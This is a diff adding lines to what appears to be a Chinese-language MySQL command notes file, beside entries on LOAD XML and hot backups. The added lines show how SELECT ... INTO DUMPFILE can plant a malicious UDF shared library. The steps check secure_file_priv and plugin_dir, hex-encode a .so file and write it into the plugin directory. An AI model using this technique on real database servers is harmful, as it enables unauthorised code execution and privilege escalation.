@@ -86,6 +86,15 @@ load xml infile 'file_name' into table 'table_name';
 
 
 
+SELECT ... INTO DUMPFILE filename;  -- writes a single row to a file without any formatting.
+
+--可以写数据到文件，实现恶意udf的注入，只需要连接权限以及secure_file_priv允许写指定路径即可操作
+--xxd xxx.so xxx.so.dump   导出的16进制格式即可
+show variables like '%secure_file_priv%';    
+show variables like '%plugin_dir%';          --查看plugin的路径
+select unhex('so文件的16进制编码') into dumpfile '/usr/lib64/mysql/plugin/xxx.so';          --写文件到plugin路径
+
+
 
 备份 
 mysqlhotcopy    ----只能用于MyISAM、ARCHIVE引擎的联机热备份
